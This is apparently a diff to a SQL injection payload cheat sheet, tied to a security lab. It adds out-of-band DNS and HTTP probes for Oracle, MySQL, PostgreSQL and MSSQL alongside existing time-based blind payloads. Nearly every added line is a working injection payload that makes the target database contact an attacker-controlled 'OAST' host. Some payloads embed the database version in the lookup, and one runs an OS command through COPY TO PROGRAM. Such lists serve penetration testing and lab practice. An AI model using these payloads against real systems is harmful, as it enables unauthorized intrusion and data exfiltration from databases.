@@ -355,3 +355,30 @@ CONCAT('','')
 '||(SELECT CASE WHEN ({COND}) THEN pg_sleep(5) ELSE pg_sleep(0) END)||'
 #    MSSQL:
 '; IF ({COND}) WAITFOR DELAY '0:0:5'-- -
+
+# =====================================================
+# OUT-OF-BAND (OAST) DNS/HTTP INTERACTION PROBES
+# Confirms injection where there is NO in-band signal.
+# Replace OAST with your Collaborator/interactsh subdomain.
+# =====================================================
+
+## ORACLE — EXTRACTVALUE + XXE (the lab's intended path)
+'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://OAST/"> %remote;]>'),'/l') FROM dual)||'
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://OAST/"> %remote;]>'),'/l') FROM dual--
+
+## ORACLE — UTL_HTTP / UTL_INADDR (need privs; try if XXE blocked)
+'||(SELECT UTL_INADDR.get_host_address('OAST') FROM dual)||'
+'||(SELECT UTL_HTTP.request('http://OAST/') FROM dual)||'
+
+## MYSQL — UNC path / LOAD_FILE (Windows hosts mainly)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.OAST\\x'))-- -
+' AND LOAD_FILE(CONCAT('\\\\OAST\\x'))-- -
+
+## POSTGRESQL — COPY / dblink (need privs)
+'; COPY (SELECT '') TO PROGRAM 'nslookup OAST'-- -
+'||(SELECT dblink_connect('host=OAST user=x password=x dbname=x'))||'
+
+## MSSQL — UNC / xp_dirtree / fn_xe_file (DNS callback)
+'; DECLARE @q VARCHAR(99);SET @q='\\'+(SELECT @@version)+'.OAST\\x'; EXEC master..xp_dirtree @q-- -
+'; EXEC master..xp_dirtree '\\OAST\x'-- -
+'; EXEC('master..xp_fileexist ''\\OAST\x''')-- -
